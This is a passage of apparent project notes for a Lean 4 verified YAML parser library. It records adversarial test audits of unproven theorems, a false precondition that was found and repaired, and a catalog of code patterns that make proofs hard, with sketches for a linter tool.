  - **Block mappings:** flat, nested 1–6 levels deep
  - **Explicit keys:** `?`/`:` syntax in block and flow
  - **Document markers:** `---`, `...`, multi-document
  - **Directives:** `%YAML 1.2`, `%TAG`
  - **Mixed flow/block:** block with flow values/keys
  - **Comments:** line, inline, comment-only
  - **Anchors/aliases:** `&anc`, `*anc` in block and flow
  - **Tags:** `!!str`, verbatim `!<...>`
  - **Emitter output:** same adversarial inputs from P1–P3
  - **Stress tests:** deep block nesting, wide sequences, kitchen-sink multi-doc
- Each input checks at every `scanNextToken` step (3–35 steps per input):
  1. No scan errors
  2. **Prefix preservation** for corrected `n` (using first disjunct only)
  3. **SK/EK invariant maintenance** (output disjunction)
  4. **Original disjunct diagnostic** — counts steps where `∨ ek=none` would allow unsafe `n`

**CRITICAL FINDING: Theorem statement has a false disjunction.**

The original `h_cond` precondition:
```
(s.simpleKey.possible → s.simpleKey.tokenIndex ≥ n) ∨ s.explicitKeyLine = none
```
The second disjunct (`explicitKeyLine = none`) is **insufficient** for prefix preservation.
Counterexample: `"a: b"` at step 1 — state has `sk.possible=true, sk.tokenIndex=1,
ek=none`. The scanner encounters `:` and overwrites `tokens[1]` (placeholder → `.key`),
violating prefix preservation for `n=4` (= `s.tokens.size`) even though `ek=none`.

**46 of 55 inputs** exhibit steps where the original disjunction allows unsafe `n`.
Prefix preservation holds correctly when `n` is restricted to
`min(s.simpleKey.tokenIndex, s.tokens.size)` when `sk.possible=true`.

**Corrected precondition should be:**
```
s.simpleKey.possible = true → s.simpleKey.tokenIndex ≥ n
```
(no `∨ explicitKeyLine = none` escape clause for prefix preservation).
The `∨ explicitKeyLine = none` is still needed in the **conclusion** (output invariant)
to maintain the inductive chain.

#### Priority 4: Reflections

- **Adversarial instantiation caught a false theorem statement.** This is the second time (after the `flowBracketBalance` fix in P1) that testing found a provably false claim. The `∨ explicitKeyLine = none` disjunct in the precondition allows prefix preservation to be claimed for indices above `simpleKey.tokenIndex`, where the scanner actively overwrites placeholder tokens.
- **The corrected invariant works.** All 55 inputs pass with prefix preservation restricted to `n ≤ simpleKey.tokenIndex` (when `sk.possible`). The SK/EK output invariant is also maintained at every step.
- **The issue is subtle.** `explicitKeyLine` and `simpleKey` are independent scanner mechanisms. `explicitKeyLine = none` means no explicit `?` key is active; it says nothing about whether the implicit simple-key mechanism will overwrite a placeholder. The disjunction conflates two unrelated conditions.
- **Impact on proof effort:** The theorem statement must be corrected before the proof can succeed. The fix is straightforward — remove the `∨ explicitKeyLine = none` from the precondition and keep it only in the conclusion. The `ScanChain_preserves_raw_prefix` usage site may need adjustment to track the first conjunct through the chain.
- **Residual risk:** LOW for the corrected statement. Prefix preservation below `simpleKey.tokenIndex` and SK/EK invariant maintenance are both empirically verified across all 55 inputs with no failures.

#### Priority 4: Theorem Repair

**Theorems repaired (3):**

| Theorem | Location (then → now) | Fix |
|---------|----------|-----|
| `scanNextToken_prefix_and_sk_inv` | EmitterScannability.lean:6623 → `L4YAML/Proofs/Output/EmitterScannability/FilteredTracking.lean:87` | Removed `∨ s.explicitKeyLine = none` from **precondition**. Conclusion's disjunction kept (needed for flow close). |
| `ScanChain_preserves_raw_prefix` | EmitterScannability.lean:6644 → `FilteredTracking.lean:104` | Removed `∨ s.explicitKeyLine = none` from **precondition**. Proof changed to `sorry` (was a structural proof relying on the false per-step theorem). |
| `ScanChain_filtered_prefix` | EmitterScannability.lean:7436 → `FilteredTracking.lean:154` | **Statement unchanged** (it IS correct). Proof changed to `sorry` — old proof went through `ScanChain_preserves_raw_prefix` with `n₀ = tokens.size`, which requires the now-removed disjunction. Needs restructuring via non-placeholder preservation argument. |

*Update (2026-07-31): all three theorems were subsequently proven, including the
re-sorried pair (`ScanChain_preserves_raw_prefix`, `ScanChain_filtered_prefix`).
They now live sorry-free at the FilteredTracking.lean locations above (the
EmitterScannability monolith was split into an `EmitterScannability/` module
family); the library as a whole is sorry-free since 2026-07-04.*

**Design decisions:**

1. **Why keep the disjunction in the conclusion?** Computational testing showed that `sk'.possible → tokenIndex ≥ n` (without `∨ ek'=none`) FAILS for 26/55 inputs at the per-step level. Flow close (`]`/`}`) restores a simpleKey from the stack with `tokenIndex` potentially < `n`, but `ek` is `none` in those cases. The disjunction in the OUTPUT is genuine.

2. **Why the chain theorem needs a different proof strategy:** The per-step conclusion gives `(sk'.possible → tokenIndex ≥ n₀) ∨ ek' = none`, but the next step's precondition needs the strong `sk'.possible → tokenIndex ≥ n₀` (no disjunction). When the disjunction gives `ek' = none`, a separate argument is needed. For typical `n₀` values (= initial `min(sk.tokenIndex, tokens.size)`, usually 1), the strong invariant holds trivially. The proof requires showing that stack-restored tokenIndices are ≥ n₀.

3. **Why `ScanChain_filtered_prefix`'s statement is correct despite the disjunction:** The filtered prefix (excluding `.placeholder` tokens) IS preserved even when `tokens[sk.tokenIndex]` is overwritten, because `tokens[sk.tokenIndex]` is always a `.placeholder` (filtered OUT in both states). The proof needs to use this insight rather than going through raw prefix preservation.

**Sorry count impact:** 11 → 13 warnings. The 2 new sorrys (`ScanChain_preserves_raw_prefix`, `ScanChain_filtered_prefix`) were previously "proven" but relied on a false sorry'd theorem — their proofs compiled but were unsound. Making them explicit sorrys is the honest fix. *(Both were subsequently proven — see the update note above.)*

**New adversarial tests added (20 chain-level checks):**
- 10 representative inputs tested with a **fixed `n₀`** across all scanning steps
- Each input checks both chain-level prefix preservation AND the strong SK invariant
- All 20/20 pass, confirming the corrected chain theorem's claim for `n₀ = min(sk₀.tokenIndex, tokens₀.size)`

**Final test total:** 697/697 (was 677 before repair; +20 chain-level tests).

#### Priority 5: ScannerBound theorems (preprocess, structural, content)

**Inputs:** States with:
- 10+ indent stack entries (deep `unwindIndents`)
- Multi-line scalars (long scanner loops)
- UTF-8 multi-byte characters (byte offset arithmetic)

**Check:** `BoundInv` fields (offset ≤ utf8ByteSize, isValidPos, etc.) after processing.

### Implementation Plan

All adversarial instantiation tests live in `Tests/AdversarialInstantiation.lean` and are
integrated into CI:

- **Build target:** `adversarialinstantiation` (`@[default_target]` `lean_exe` in `lakefile.lean`)
- **Standalone runner:** `Tests/AdversarialInstantiation/Runner.lean` → `.lake/build/bin/adversarialinstantiation`
- **Suite runner:** Included via `Tests.AdversarialInstantiation.collectTests` in `Tests/SuiteRunner/Main.lean`
- **Report:** Appears in HTML/JSON reports as "Adversarial Instantiation Tests (sorry audit)"

For each priority:
1. Add test functions (`test9g`, `test9h`, ...) and register in `collectTests`
2. Use `TestCollector` + `check`/`checkM` macros for VerifiedSuiteResult integration
3. Any check failure → investigate and fix the theorem statement before proving
4. All checks pass → proceed to proof with increased confidence

**Status:** Priority 1 complete (188/188). Priority 2 complete (141/141). Priority 3 complete (180/180). Priority 4 complete (168→697 checks after repair, **false theorem found and repaired**). Priority 5 complete (296 checks). Total: 993/993.

#### Priority 5: Accomplishments

- Tested all 3 sorry'd theorems in `ScannerBound.lean`: `preprocess_preserves_bound`, `dispatchStructural_preserves_bound`, `dispatchContent_preserves_bound`
- Checked all 4 `BoundInv` fields computationally at every `scanNextToken` step: `offset ≤ inputEnd`, `inputEnd` preserved, `input` preserved, offset at valid UTF-8 char boundary
- Implemented `isAtCharBoundary` helper to computationally verify `String.Pos.Raw.IsValid` (private constructor, cannot be checked directly)
- 296 new checks across ~74 test inputs covering:
  - Deep indent stacks (2-8 levels) stressing `unwindIndents` loop
  - Whitespace/comment skipping stressing `skipToContent` loop
  - Document markers and directives (structural dispatch with `advanceN 3`)
  - All scalar types: double-quoted (escapes, unicode, multiline, empty), single-quoted, block literal/folded (with modifiers), plain
  - Anchors, aliases, tags
  - UTF-8 multi-byte characters: 2-byte (résumé), 3-byte (日本語), 4-byte (𝕊𝕖𝕥), emoji (😀), mixed
  - Combined stress test exercising every dispatch type in one document
  - Emitter output (scanner round-trip on emitted YAML)
  - Edge cases: empty, whitespace-only, newlines-only, BOM
- All 296 checks pass — no false claims detected in BoundInv theorems

#### Priority 5: Reflections

- `BoundInv` is a clean 4-field invariant that is straightforward to check computationally
- The `String.Pos.Raw.IsValid` field required a custom `isAtCharBoundary` function since the type has a private constructor — iterating valid string positions from offset 0 is the only way to check
- In Lean 4.30, `String.Pos` is parameterized by a `String` (dependent type), so raw byte iteration uses `String.Pos.Raw.next` instead of `String.next`
- UTF-8 multi-byte inputs are critical adversarial cases for byte offset arithmetic — confirmed all 4-byte, 3-byte, 2-byte, and mixed character inputs maintain valid char boundaries
- All 3 sorry'd theorems appear sound: the scanner never violates `BoundInv` across any of the tested inputs

#### Priority 6: Flow parser helper lemmas (parseNode nested brackets)

**Status:** Added 2026-04-17 after completing `flow_parser_ok_of_structure` refactoring.

These 3 helper lemmas support `flow_parser_ok_of_structure` and handle nested bracket cases within flow sequences and mappings:

1. `parseNode_flowSeqStart_in_seq` — parseNode on nested `[...]` inside a sequence
2. `parseNode_flowMapStart_in_seq` — parseNode on nested `{...}` inside a sequence
3. `parseEntry_in_flowMap` — parseExplicitKey + parseFlowMappingValue in a mapping

**Risk assessment:**
- **Statement risk:** HIGH — ∀ over parse states, complex bracket balance conditions, nested inductive hypothesis
- **Proof cost:** HIGH — requires coordination with `parseFlowSequenceLoop_emitter_ok` and `parseFlowMappingLoop_emitter_ok`, which have complex preconditions

**Decision:** AUDIT first. The scalar case (`parseNode_scalar_in_seq`) was straightforward (25 LOC), but the nested bracket cases require coordinating IH with loop theorems and setting up multiple preconditions about bracket balance, content positions, and token array bounds. Investment in adversarial instantiation will catch any false claims before spending hours on complex proofs.

**Test approach:**
- Emit diverse nested structures (sequences containing sequences/mappings, mappings with nested values)
- Find nested bracket tokens at depth-0 positions in the body
- Call `parseNode`, `parseExplicitKey`, `parseFlowMappingValue` directly at those positions
- Verify: (1) parse succeeds with `fuel = 4*N+4`, (2) position advances, (3) tokens preserved, (4) result stays within bounds

#### Priority 6: Accomplishments

- **108 new checks** (1199 total: 188 P1 + 141 P2 + 180 P3 + 168 P4 + 296 P5 + 108 P6), all passing
- Tested all 3 helper lemmas across 16 adversarial inputs:
  - **parseNode_flowSeqStart_in_seq (30 checks):** nested sequences at various depths, after scalars, multiple nested sequences in one outer sequence
  - **parseNode_flowMapStart_in_seq (30 checks):** nested mappings at various depths, after scalars, mappings with nested sequence values
  - **parseEntry_in_flowMap (48 checks):** single/multi-pair mappings, nested sequences/mappings as values, deeply nested complex structures
- Each test verifies:
  1. Scan succeeds on emitted YAML
  2. Finds expected nested bracket token (outer-level `[`, `{`, or `.key`)
  3. `parseNode`/`parseExplicitKey` succeeds at that position
  4. `parseFlowMappingValue` succeeds after key parsing (map entry case)
  5. Position advances (ps'.pos > ps.pos)
  6. Tokens preserved (ps'.tokens.size unchanged)
- Inputs tested up to 3 levels of nesting with mixed sequence/mapping structures
- All 108 checks pass — no false claims detected

#### Priority 6: Reflections

**Confidence level:** HIGH. The theorem statements for these 3 helper lemmas match observed parser behavior across diverse nested bracket inputs covering:
- Single nesting (one level: `[[a]]`, `[{k:v}]`)
- Multi-level nesting (2-3 levels: `[[[a]]]`, `{k:[{inner:v}]}`)
- Mixed nesting (sequences containing mappings and vice versa)
- Complex real-world patterns (`{k1:[a], k2:{x:y}}`)

**What was verified:**
- The `fuel = 4 * tokens.size + 4` bound suffices for parsing nested brackets (consistent with Priority 3 findings)
- Position advancement works correctly across all nesting patterns
- Token array remains unchanged (no structural modifications during parsing)
- Both `parseNode` (for nested brackets) and `parseExplicitKey`+`parseFlowMappingValue` (for map entries) succeed as claimed

**Residual risk:** LOW. The theorem statements are sound. The proofs require careful coordination with `parseFlowSequenceLoop_emitter_ok` and `parseFlowMappingLoop_emitter_ok` (matching their complex preconditions about bracket balance, content-start positions, and after-flowEntry behavior), but the claims themselves are correct. The scalar case (`parseNode_scalar_in_seq`) is already proven (25 LOC), confirming the refactoring approach is viable.

**Proof strategy (documented for future work):**
1. Use `bracket_seq`/`bracket_map` from `SeqBodyProps`/`MapBodyProps` to find matching closing bracket
2. Invoke IH on inner body (span `j - (ps.pos+1) < endPos - body_start`)
3. Construct `SeqBodyProps`/`MapBodyProps` for inner body via `FlowSubrangesOk.seq`/`.map`
4. Set up all preconditions for `parseFlowSequenceLoop_emitter_ok`/`parseFlowMappingLoop_emitter_ok`:
   - `h_at_end`: if advance.peek = flowSequenceEnd, then pos = j (use `content_start` to rule out empty)
   - `h_content_start`: first body token is content-start (from inner `SeqBodyProps.content_start`)
   - `h_after_fe`: every outer-level flowEntry is followed by content-start (from inner `after_fe`)
   - `h_bal`: bracket balance at advance.pos is 0 (compose outer balance + single-token delta)
5. Invoke loop theorem, get result `ps_loop` at matching bracket
6. Construct `parseFlowSequence`/`parseFlowMapping` result via loop + advance over closing bracket
7. Build existential witness with position/bracket balance proofs

**Note on complexity:** The nested bracket proofs are significantly more complex than the scalar case because they require:
- Recursive IH application (smaller span)
- Loop theorem invocation (8+ preconditions to establish)
- Type alignment across `ps.tokens`, `ps.advance.tokens`, and raw `tokens`
- Arithmetic reasoning about fuel reduction, position bounds, and span relationships

The adversarial instantiation confirms the effort is worthwhile — these theorems are not false claims.

---

## Proof-breaking code patterns

*(was `INTERACTIONS.md` — "Detecting Proof-Breaking Code Patterns via Static Analysis"; consolidated into this file 2026-08-01, file-level history in git)*

### Motivation

During the proof of `parseSinglePairMapping_wb` (2026-03-15), we identified two
code patterns that cause disproportionate proof difficulty:

1. **Struct `with`-updates before lemmatized method calls.** When a function
   does `{ ps with currentPath := ... }.tryConsume .value`, existing lemmas
   about `ps.tryConsume` don't unify — Lean 4's elaborator cannot see that
   irrelevant field updates don't affect the relevant projections.

2. **Flow-style collection constructors inside non-flow theorem signatures.**
   Functions returning `.mapping .flow` or `.sequence .flow` require
   `Scannable child true` for all children (because `inFlow || .flow == .flow`
   evaluates to `true`), but the standard `_wb` theorem signature only
   guarantees `Scannable _ true` conditionally on `flowNesting > 0`.

Both patterns are invisible to testing and code review — the functions work
correctly. The problems only manifest during proof construction. A static
analysis tool could detect these patterns **before** proof work begins,
saving significant effort.

### Proposed Tool: `#check_wb_interactions`

> **Status (2026-07-31):** `#check_wb_interactions` was **never implemented** —
> no such command exists in the codebase, and the implementation plan below is
> historical. The durable content of this document is the six-pattern catalog
> and the (manually produced) analysis of the G5c functions. The proof campaign
> the tool was meant to serve is complete: the library is sorry-free since
> 2026-07-04 (see Blueprint/04-capstones.md).

#### Architecture

A Lean 4 metaprogramming command `#check_wb_interactions` that:
1. Collects all function definitions in a specified mutual block
2. For each function, analyzes the elaborated `Expr` to detect the two
   interaction patterns
3. Reports warnings with suggested mitigations

#### Detection Algorithm

##### Pattern 1: Struct `with`-updates before method calls

**What to detect:** An expression of the form `f ({ r with field := v })` where:
- `r` is a local variable (fvar)
- `f` is a function for which a lemma exists that takes `r` directly
  (e.g., `tryConsume_tokens (ps : ParseState) ...`)
- The `field` being updated is not used by `f`

**Implementation sketch:**

```lean
/-- Check whether a struct-with-update feeds into a method call
    whose proof lemmas were stated for the original variable. -/
def checkStructWithBeforeMethod (e : Expr) : MetaM (Array Warning) := do
  let warnings := #[]
  -- Walk the expression tree
  e.forEach fun sub => do
    -- Look for applications where an argument is a struct-with-update
    if let .app f arg := sub then
      if isStructWith arg then
        let (baseVar, updatedFields) := decomposeStructWith arg
        let fnName := f.getAppFn.constName?
        -- Check if there exist lemmas about fnName applied to baseVar's type
        -- whose conclusions mention projections NOT in updatedFields
        if let some lemmas ← findLemmasFor fnName then
          for lemma in lemmas do
            let relevantFields := extractRelevantFields lemma
            if relevantFields.all (· ∉ updatedFields) then
              warnings := warnings.push {
                span := sub.getPos?
                msg := s!"Struct-with-update on '{updatedFields}' before " ++
                       s!"'{fnName}' — lemma '{lemma.name}' expects the " ++
                       s!"original variable. May need a '_with_{field}' variant."
              }
  return warnings
```

**Key sub-problems:**

1. **Recognizing struct-with-updates in elaborated `Expr`.** After
   elaboration, `{ ps with currentPath := p }` becomes a sequence of
   struct constructor applications:
   ```
   ParseState.mk ps.tokens ps.pos ps.anchors ps.tagHandles
                  ps.trackPositions p ps.nodePositions
   ```
   Detection: an application of a struct constructor where all but one
   argument is a projection of the same fvar.

2. **Finding relevant lemmas.** Use `Lean.Meta.getEqnsFor?` or search the
   environment for theorems whose type mentions the same function name.
   Alternatively, maintain a registry of "proof-relevant methods" —
   functions like `tryConsume`, `advance`, `peek?` that have associated
   property lemmas.

3. **Determining field relevance.** For a lemma about `tryConsume_tokens`,
   inspect which struct projections appear in the lemma's type (`.tokens`,
   `.pos`, `.peek?`). If the `with`-update modifies a field NOT among
   these, the lemma is applicable in principle but won't unify.

##### Pattern 2: Flow collection return type vs. theorem signature

**What to detect:** A function that:
- Returns a value constructed with `.mapping .flow` or `.sequence .flow`
- Has (or will have) a `_wb` theorem with `Scannable result.1 false` in
  the conclusion
- Contains `parseNode` calls whose `Scannable _ true` output is conditional

**Implementation sketch:**

```lean
/-- Check whether a function returns a flow-style collection, which
    requires Scannable _ true for all children regardless of context. -/
def checkFlowCollectionReturn (decl : ConstantInfo) : MetaM (Array Warning) := do
  let body ← getDefBody decl
  let warnings := #[]
  -- Find all .ok return expressions
  for retExpr in findReturnExprs body do
    if isFlowCollection retExpr then
      -- Check if any child of the collection comes from parseNode
      let children := extractCollectionChildren retExpr
      for child in children do
        if comesFromParseNode child then
          warnings := warnings.push {
            msg := s!"'{decl.name}' returns .mapping/.sequence .flow with " ++
                   s!"parseNode-derived children. The _wb theorem needs " ++
                   s!"'flowNesting > 0' as a precondition (not conditional)."
          }
  return warnings
```

**Key sub-problems:**

1. **Tracing data flow from `parseNode` to collection children.** After
   elaboration, the connection between a `← parseNode ps fuel` bind and
   the final `.mapping .flow #[(key, val)]` return is obscured by monadic
   desugaring. Need to follow let-bindings and `Except.bind` continuations.

2. **Distinguishing `emptyNode` from `parseNode` children.** `emptyNode`
   children don't need the flow hypothesis (they satisfy `Scannable _ true`
   unconditionally). Only `parseNode`-derived children create the problem.
   Detection: check whether the child variable was bound by a
   `parseNode` call in the monadic chain.

3. **Cross-referencing with theorem signatures.** If no `_wb` theorem
   exists yet, report the warning preemptively. If one exists, check
   whether it already has `flowNesting > 0` as a hypothesis.

#### Integration Points

##### Option A: Command-line linter (recommended for initial version)

```lean
/-- Run interaction checks on all functions in the mutual block
    containing the given declaration. -/
syntax "#check_wb_interactions" ident : command

-- Usage:
#check_wb_interactions parseSinglePairMapping
-- Output:
-- ⚠ parseSinglePairMapping: struct-with-update on 'currentPath' before
--   'ParseState.tryConsume' at L707. Lemma 'tryConsume_tokens' expects
--   the original variable. Consider a '_with_path' variant.
-- ⚠ parseSinglePairMapping: returns .mapping .flow with parseNode-derived
--   children. The _wb theorem needs 'flowNesting > 0' as a precondition.
```

##### Option B: Elaboration hook (future)

Register as an `afterElaboration` hook that runs automatically on every
definition in files importing `ParserGrammable`. This would catch new
instances immediately when G5c-style modifications are made.

##### Option C: CI integration (future)

Run as a `lake script check-interactions` step that processes the mutual
block and fails CI if new unmitigated interactions are detected.

##### Pattern 3: WHNF expansion of compound expressions inside `split`

**What to detect:** A function whose monadic chain contains a compound
expression (method call with computed arguments, struct-with-update
followed by method call) whose internal match structure has more branches
than the outer dispatch that the proof intends to split on.

**Why it matters:** When `split at h_ok` is used to peel through monadic
branches, WHNF expands sub-expressions to find the outermost match.
If a sub-expression like `tryConsume` contains `match peek? with ... | some t =>
if t == tok then (true, advance) else (false, ps)`, this **inner** 3-way
match is found before the **outer** `if consumed then ...` dispatch.
The proof silently splits on the wrong match, producing goals where the
`consumed` flag is still unevaluated as a compound expression.

**Mitigation (proof-side):** Use `generalize` to make the compound
sub-expression opaque before splitting:
```lean
generalize hg : ParseState.tryConsume _ _ = tc at h_ok
split at h_ok  -- now finds `if tc.fst then ...` cleanly
```

**Mitigation (code-side):** Extract the compound expression into a `let`
binding so that after `unfold` and `simp only [bind, Except.bind]`, the
name is preserved and `split` finds the outer dispatch first:
```lean
let tc := { ps with currentPath := path }.tryConsume .value
let (consumed, ps) := tc
if consumed then ...
```

**Implementation sketch:**

```lean
/-- Check whether a function has compound expressions feeding into
    outer dispatch matches, creating WHNF-expansion hazards. -/
def checkWHNFExpansionHazard (e : Expr) : MetaM (Array Warning) := do
  let warnings := #[]
  -- Find `if` / `match` dispatches whose scrutinee is a projection
  -- of a method call (not a simple fvar)
  e.forEach fun sub => do
    if let .app (.app (.const ``ite _) cond) _ := sub then
      -- Check if cond involves a projection of a compound expression
      if isProjectionOfCompound cond then
        let innerMatches := countMatchBranches (getCompoundBase cond)
        let outerMatches := 2  -- if/then/else
        if innerMatches > outerMatches then
          warnings := warnings.push {
            msg := s!"WHNF hazard: '{getCompoundBase cond}' has " ++
                   s!"{innerMatches} internal branches but feeds into " ++
                   s!"a {outerMatches}-branch dispatch. " ++
                   s!"`split` may target the inner match. " ++
                   s!"Consider extracting to a let binding."
          }
  return warnings
```

##### Pattern 4: Complexity explosion in monolithic loop bodies

**What to detect:** A recursive (or tail-recursive) function whose body
contains multiple independent dispatch branches that each perform
structurally similar sub-computations (key dispatch, tryConsume, value
dispatch), leading to a combinatorial explosion in proof cases.

**Why it matters:** When a loop body has $N$ entry patterns, each with $M$
internal dispatch branches, the proof must handle $N \times M$ cases, many
of which are nearly identical. The complexity scales multiplicatively rather
than additively. This is invisible to code review — the function is clean,
well-structured, and correct — but the proof becomes unmanageable.

**Canonical example:** `parseFlowMappingLoop` (TokenParser.lean L631–690)
has two entry patterns:
- **Explicit key** (`some .key`): advance, key dispatch (3 emptyNode cases +
  parseNode catch-all), tryConsume `.value`, value dispatch (3 emptyNode cases
  + parseNode catch-all), recurse
- **Implicit key** (catch-all `_`): parseNode, tryConsume `.value`, value
  dispatch (same 4 × 2 structure), recurse

The tryConsume + value dispatch tail is **identical** between both branches.
Each proof case requires ~40 lines (key/value WB extraction, flowNesting
chain, tokens chain, Scannable pair construction). Total: ~320 lines of
largely duplicated proof for 8 cases (2 entry × 2 consumed × 2 value).

Compare `parseFlowSequenceLoop` (L575–612): only 3 content dispatch branches
(key → `parseSinglePairMapping`, `flowSequenceEnd`, parseNode catch-all), each
with a single value. The proof (`parseFlowSequenceLoop_wb`) is ~110 lines.

**Mitigation (code-side):** Factor out the shared sub-computation as a named
function, then prove a single well-behavedness lemma for it:

```lean
/-- Extract a single mapping entry (key + optional value).
    Shared logic for explicit-key and implicit-key branches. -/
def parseFlowMappingEntry (ps : ParseState) (fuel : Nat) (pairIndex : Nat)
    (key : YamlValue) : Except ScanError ((YamlValue × YamlValue) × ParseState)
```

Then the loop proof delegates to `parseFlowMappingEntry_wb` exactly as
`parseFlowSequenceLoop_wb` delegates to `parseSinglePairMapping_wb`.

**Relationship to Wadler's "theorems for free":** Before refactoring, we can
derive **behavioral specifications** from the current `parseFlowMappingLoop`
type signature and implementation that must be preserved:

1. **Monotonicity**: `result.1.size ≥ pairs.size` (the loop only appends)
2. **Token preservation**: `result.2.tokens = ps.tokens` (no token mutation)
3. **flowNesting preservation**: `flowNesting tokens result.2.pos =
   flowNesting tokens ps.pos` (in flow context)
4. **Item well-behavedness**: All items in `result.1` satisfy `Scannable` at
   the appropriate polarity

These "free theorems" serve as regression tests for the refactoring: if the
factored version satisfies the same specifications, behavior is preserved.
The Wadler approach suggests deriving what we can from the type (parametricity)
— here the key insight is that `parseFlowMappingLoop` is parametric in the
*content* of key/value parsing (it just threads state), so any factoring that
preserves the state-threading discipline preserves behavior.

**Implementation sketch:**

```lean
/-- Check whether a recursive function has multiple branches with
    structurally similar sub-computations. -/
def checkComplexityExplosion (decl : ConstantInfo) : MetaM (Array Warning) := do
  let body ← getDefBody decl
  let branches := findRecursiveCallBranches body
  -- Group branches by structural similarity (same sequence of bind operations
  -- with different initial dispatch but shared tail)
  let groups := groupBySimilarTail branches
  for group in groups do
    if group.size > 1 then
      let sharedTail := computeSharedTail group
      warnings := warnings.push {
        msg := s!"'{decl.name}' has {group.size} branches sharing a common " ++
               s!"tail of {sharedTail.bindCount} bind operations. " ++
               s!"Consider extracting to a subfunction to reduce proof cases " ++
               s!"from {totalCases group} to {reducedCases group}."
      }
  return warnings
```

##### Pattern 5: Semantic impasse from specification-level invariant gaps

**What to detect:** A proof obligation that reduces (after available rewrites)
to an arithmetic impossibility — e.g., `x + 1 = x`, `f x + c = f x` for
`c > 0` — indicating that the theorem's claim is **unprovable** in a
particular branch, not merely difficult. This signals a missing invariant at
a higher level (e.g., scanner, grammar) rather than a proof technique gap.

**Why it matters:** Without detection, these cases consume unbounded proof
effort. The prover tries increasingly sophisticated techniques on a goal
that is literally false in the current context. The root cause is that
the theorem was stated under implicit assumptions (e.g., "the closing bracket
is always consumed") that are not formalized as hypotheses.

**Canonical example:** `parseFlowSequence_wb`, else-branch (no flowSequenceEnd
consumed). After rewriting:
```
h_adv_fn_eq : flowNesting tokens ps.advance.pos = flowNesting tokens ps.pos + 1
h_loop_fn : flowNesting tokens ps_loop.pos = flowNesting tokens ps.advance.pos
⊢ flowNesting tokens ps_loop.pos = flowNesting tokens ps.pos
```
Substituting: `flowNesting tokens ps.pos + 1 = flowNesting tokens ps.pos`. This
is `x + 1 = x` — false for all `x : Nat`.

**Root cause analysis:** The theorem claims `flowNesting` is preserved through
`parseFlowSequence`. This is true when `flowSequenceEnd` is consumed (the
`+1` from `flowSequenceStart` is cancelled by `-1` from `flowSequenceEnd`).
But the implementation has an `else` branch where `flowSequenceEnd` is NOT
consumed (fuel exhaustion, or the loop exits without seeing the end token).
In this branch, the net `flowNesting` change is `+1`, not `0`.

**Resolution options:**

1. **Scanner invariant (Option 1):** Add a `FlowBracketsMatched` property to
   `FlowAwarePSV` proving that every `flowSequenceStart`/`flowMappingStart`
   has a matching `flowSequenceEnd`/`flowMappingEnd` at a later position.
   Combined with a fuel-sufficiency argument, this makes the else-branch
   unreachable (`False.elim`).

2. **Fuel-sufficiency (Option 2):** Prove that when `parseFlowSequence`
   returns `.ok`, the loop **always** consumed `flowSequenceEnd` (i.e., the
   else-branch yields `.error` or is never reached). This follows from the
   scanner guaranteeing matched brackets: with well-formed tokens, the loop
   sees `flowSequenceEnd` and exits via the `some .flowSequenceEnd` branch
   before fuel runs out.

3. **Combined approach (Options 1 + 2):** Add `FlowBracketsMatched` to
   the scanner invariant chain (Option 1), then prove a lemma that
   `parseFlowSequence` on matched-bracket tokens always takes the
   `some .flowSequenceEnd` branch (Option 2). This is the most robust
   approach: Option 1 provides the semantic foundation, Option 2 provides
   the syntactic consequence.

**Detection mechanism — automated impasse detection:**

```lean
/-- After tactic execution leaves a numeric goal, check if it's
    a trivial impossibility. -/
def checkArithmeticImpasse (goal : MVarId) : MetaM (Option Warning) := do
  let target ← goal.getType
  -- Normalize the target
  let target ← Meta.reduce target
  -- Check for patterns like `n + k = n` or `n = n + k` where k > 0
  if let some (lhs, rhs) := isEqNat target then
    -- Try to show lhs - rhs or rhs - lhs is a positive constant
    let diff ← Meta.reduce (← mkAppM ``Nat.sub #[lhs, rhs])
    if isPositiveLiteral diff then
      return some { msg := s!"Arithmetic impasse: goal reduces to " ++
        s!"'{← ppExpr target}' which requires {← ppExpr diff} = 0. " ++
        s!"This suggests a missing invariant that would make this " ++
        s!"branch unreachable." }
  return none
```

**Generalized detection — "rewrite saturation + impossibility check":**

A more general approach: after applying all available `rw` lemmas from
hypotheses to the goal, run `omega` or `norm_num`. If these **succeed
in proving `False`** from the goal + hypotheses, the branch is unreachable
given a missing invariant. If they succeed in closing the goal, no impasse.
If they fail but the goal has a simple arithmetic structure, flag as a
potential impasse.

##### Pattern 6: Wadler-style "theorems for free" on inductive constructors — parametric closing

**What to detect:** A theorem whose proof cases-splits on an inductive type
(e.g., `PendingNode`), and then performs **identical evidence extraction**
in multiple branches before diverging only in the final "closing strategy."
The evidence extraction is parametric — it doesn't depend on which constructor
was matched — but gets duplicated because the proof is organized by constructor
rather than by evidence.

**Why it matters:** This is the inductive-type analogue of Wadler's parametricity
principle for polymorphic functions. Just as `f : ∀ α, F α → G α` is constrained
by parametricity (the function can't inspect `α`), constructors that share a
closure interface (e.g., `h_closable : ∀ sp, SSLComments sp_scan sp → SLYamlStream`)
are parametric in how they close — evidence extraction should happen once,
and each constructor only contributes its closing strategy.

**Canonical example:** `accum_content_pending` in StreamAccum.lean (~300 lines).
For the `noPending` col=0 case and the `pendingBlock` case, the **same**
evidence extraction is repeated verbatim for each content type:

```lean
-- This 8-line block appears IDENTICALLY for each content type × each PendingNode case:
obtain ⟨sp_dq, h_dq_gram, hcorr_dq⟩ :=
  dispatchContent_doubleQuoted_prod _ sp_prep
    (corr_of_allowDirectives_update hcorr_prep) hpeek_disp h_dispatch
have hsp_dq_eq := ScannerSurfCorr_unique hcorr_dq hcorr_result
rw [hsp_dq_eq] at h_dq_gram hcorr_dq
have h_flow : SFlowNode 0 .flowOut sp_prep sp_scan' :=
  SFlowNode_doubleQ_ctx_lift h_dq_gram (by decide) (by decide)
```

Only the **closing strategy** differs:
- `noPending`: `SBlockNode → SLBareDocument → SLYamlStream.implicitContinue → pendingContent`
- `pendingBlock`: `SBlockNode.flowInBlock → h_close_old → pendingBlockContent`

**Mitigation:** Factor out a **unified evidence extraction theorem** that
produces a disjunction over all supported content types:

```lean
-- Proven ONCE, covering all content types:
theorem dispatchContent_evidence (...) :
    (∃ sp', SFlowNode 0 .flowOut sp_prep sp' ∧ ScannerSurfCorr s' sp')
  ∨ (∃ sp', (SCLLiteral 0 sp_prep sp' ∨ SCLFolded 0 sp_prep sp') ∧ ScannerSurfCorr s' sp')
  ∨ sorry  -- catch-all for not-yet-proven types
```

Then each `PendingNode` constructor contributes only its closing strategy
(~5-10 lines), and adding a new content type requires changes only in the
evidence theorem.

**Relationship to Wadler:** In the original "Theorems for Free" (Wadler 1989),
